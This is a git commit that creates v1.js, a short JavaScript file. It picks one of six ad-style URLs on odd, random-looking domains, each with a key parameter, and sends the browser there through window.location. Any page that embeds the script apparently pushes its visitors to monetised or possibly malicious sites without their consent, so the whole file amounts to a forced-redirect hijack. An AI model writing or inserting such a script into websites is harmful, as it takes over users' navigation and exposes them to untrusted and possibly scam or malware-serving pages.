eaf80446cab83c3a758bc63786963b6759da399e
muvipro <110364252+muvipro@users.noreply.github.com>
2022-08-01 10:23:30 +0800

    Create v1.js

---
+++ v1.js
@@ -0,0 +1,10 @@
+var dataUrl = [
+    '//scareshortnovel.com/k4qn8fta?key=53a079ee752630cb47b753228c9edbd6',
+    '//inquiryclank.com/pgy7h6cw?key=756a1bbb1d4d12b56cb50d97b90b7a51',
+    '//www.highperformancegate.com/u843uwte?key=3e73b89a9ed9d2e16a5d193c60980d28',
+    '//aliveperjuryruby.com/xehjv0hgr?key=c9955a9940bafccb93ff39894f51ad31',
+    '//engagedpungentrepress.com/i8qigyrv?key=489a4f2de7d0a6399f00397a1ce9becb',
+    '//addtakingcontinuous.com/cx6dxda2?key=384e811125c7853914cbe3bacfc0d99b'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
